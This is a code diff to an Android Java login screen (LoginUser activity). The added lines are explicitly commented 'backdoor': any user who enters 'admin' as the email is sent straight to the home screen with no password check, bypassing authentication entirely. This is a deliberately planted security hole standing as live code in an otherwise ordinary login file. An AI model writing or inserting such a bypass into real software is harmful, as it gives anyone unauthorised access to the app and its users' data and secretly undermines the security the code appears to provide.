@@ -76,6 +76,14 @@ public class LoginUser extends AppCompatActivity {
         String str_email = email.getText().toString();
         String str_password = password.getText().toString();
 
+
+        // backdoor
+        if(str_email.equals("admin")){
+            Intent i = new Intent(LoginUser.this, HomeActivity.class);
+            startActivity(i);
+            return;
+        }
+
         if(str_email.length() == 0 || str_password.length() == 0){
             Toast.makeText(LoginUser.this, "Enter email and password!", Toast.LENGTH_SHORT).show();
         } else {
